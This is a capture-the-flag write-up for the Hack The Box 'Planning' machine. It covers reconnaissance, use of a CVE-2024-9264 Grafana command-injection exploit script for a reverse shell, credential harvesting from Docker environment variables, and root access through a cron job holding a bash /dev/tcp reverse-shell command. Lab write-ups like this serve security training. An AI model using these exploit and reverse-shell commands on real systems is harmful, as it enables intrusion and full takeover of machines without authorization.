# Planning

```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | `N/A` | Nmap, ffuf, Initial Credentials | Performed an initial Nmap scan to discover open ports and services, identifying an `nginx` web server. Vhost fuzzing with `ffuf` revealed `grafana.planning.htb`, and the provided credentials (`admin:0D5oT70Fq13EvB5r`) were used to log in. |
| 2 | `root` | CVE-2024-9264, Docker Enumeration | Exploited a command injection vulnerability (CVE-2024-9264) in Grafana to gain an initial shell. Found plaintext SSH credentials (`enzo:RioXXXXXXXXXXXXX!`) in the Docker container's environment variables. |
| 3 | `enzo` | SSH Access | Used the discovered credentials to log in to the host machine via SSH as the `enzo` user, which provided access to the `user.txt` flag. |
| 4 | `enzo` | Port Forwarding, File Enumeration | Identified a local service on port 8000. Used SSH to port-forward this service to the local machine (`ssh -L 8000:127.0.0.1:8000 enzo@planning.htb`). Discovered a password (`P4ssXXXXXXXXXXXXX`) for the service in the `crontab.db` file. |
| 5 | `root` | Cron Job Manipulation | Logged into the cron management web interface as the `root` user with the discovered password. Added a new cron job with a reverse shell command. |
| 6 | `root` | Cron Job Execution | The cron job executed as the root user, providing a privileged shell to retrieve the `root.txt` flag. |

**Planning Machine** is an easy-level Linux machine from Season 7 of Hack The Box. The initial credentials provided for the web application are `admin / 0D5oT70Fq13EvB5r`. The machine is an Ubuntu system and features a Dockerized environment, which is a key part of the exploitation path.



#### 1\. Initial Reconnaissance & Enumeration

The first step is always to get a good lay of the land. We start with a comprehensive Nmap scan to identify open ports, running services, and the operating system.

```bash
nmap -A -v -p- -T4 -P0 -oX planning_tcp.scan 10.10.11.68 --webxml
```

The scan reveals two open ports:

  * **Port 22/tcp**: Running **OpenSSH 9.6p1 Ubuntu**
  * **Port 80/tcp**: Running an **nginx 1.24.0 (Ubuntu)** web server

A critical detail from the Nmap output is the `http-title` which states `Did not follow redirect to http://planning.htb/`. This tells us that the web server expects a specific hostname. We must add the entry `10.10.11.68 planning.htb` to our `/etc/hosts` file to correctly resolve the domain.

After accessing `http://planning.htb` in a browser, we see a simple web page with no immediately obvious vulnerabilities. We need to dig deeper.

#### 2\. Web Fuzzing and Vhost Discovery

Since the main page is a dead end, we move on to fuzzing to discover hidden content. We use `ffuf` with a common wordlist.

```bash
# Fuzzing for common directories and files
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://planning.htb/FUZZ

# Fuzzing for vhosts (Virtual Hosts)
ffuf -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt -H "Host: FUZZ.planning.htb" -u http://planning.htb -fs 178
```

The vhost fuzzing proves fruitful, revealing a subdomain: **`grafana.planning.htb`**. We add this to our `/etc/hosts` file as well: `10.10.11.68 grafana.planning.htb`.

#### 3\. Gaining an Initial Foothold (User Flag)

Accessing `http://grafana.planning.htb` presents a Grafana login page. We use the credentials provided in the machine information: `admin` and `0D5oT70Fq13EvB5r`. The login is successful, but the Grafana instance appears empty with no dashboards or useful information.

We check the Grafana version, which is **v11.0.0**, and search for public exploits. We find a recent vulnerability, **CVE-2024-9264**, which is a high-severity arbitrary command execution flaw. A quick search for a Proof of Concept (PoC) reveals a Python script.

We download the PoC and use it to get a reverse shell.

```bash
# Start a netcat listener on our machine
nc -lvnp 4445

# Run the exploit script
python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip <OUR_IP> --reverse-port 4445
```

This successfully grants us a shell, but we soon realize we are inside a **Docker container**. The `env` command is the key to escaping.

```bash
root@7ce659d667d7:~# env
...
GF_SECURITY_ADMIN_USER=enzo
GF_SECURITY_ADMIN_PASSWORD=RioXXXXXXXXXXXXX!
...
```

The environment variables expose a new set of credentials for a user named `enzo`. These credentials are `enzo` and `RioXXXXXXXXXXXXX!`.

We exit the container shell and try to SSH into the main host with these new credentials.

```bash
ssh enzo@planning.htb
```

The login is successful, and we are on the main host machine. This allows us to grab the `user.txt` flag.

#### 4\. Privilege Escalation to Root

With access as the `enzo` user, we start looking for a way to escalate privileges.

1.  **Port Forwarding**: Local enumeration reveals a service running on port 8000, but only on the loopback interface (`127.0.0.1`). We can't access it directly from our machine. The solution is to use SSH port forwarding to tunnel the traffic from our local port to the remote host's port.

    ```bash
    ssh enzo@planning.htb -L 8000:127.0.0.1:8000
    ```

    This command forwards our local port 8000 to the remote host's port 8000. We can now access the service by navigating to `http://localhost:8000` in our browser.

2.  **Web Service Discovery**: The service on port 8000 is a custom web application that manages `crontab` tasks. It requires a password to log in.

3.  **Password Discovery**: Back on the server, we find a file called `crontab.db`. This file contains the password for the web application's root user. Using this password with the username `root` on the login page gives us access to the `crontab` management panel.

4.  **Creating a Malicious Cron Job**: The panel allows us to create new cron jobs that are executed as the `root` user. We simply create a new task and add a reverse shell command.

    ```bash
    # Example command to add to the cron job
    bash -c 'bash -i >& /dev/tcp/<OUR_IP>/4446 0>&1'
    ```

    We set up a new `netcat` listener on our machine on port 4446 and save the cron job.

5.  **Root Shell**: The cron job runs shortly after being created, and we receive a shell as the `root` user. We can now read the `root.txt` flag and fully compromise the machine.

    ```bash
    root@planning:~# ls -la
    total 40
    ...
    -rw-r-----  1 root root   33 May 26 10:05 root.txt
    ...
    ```

**Pwned! Planning**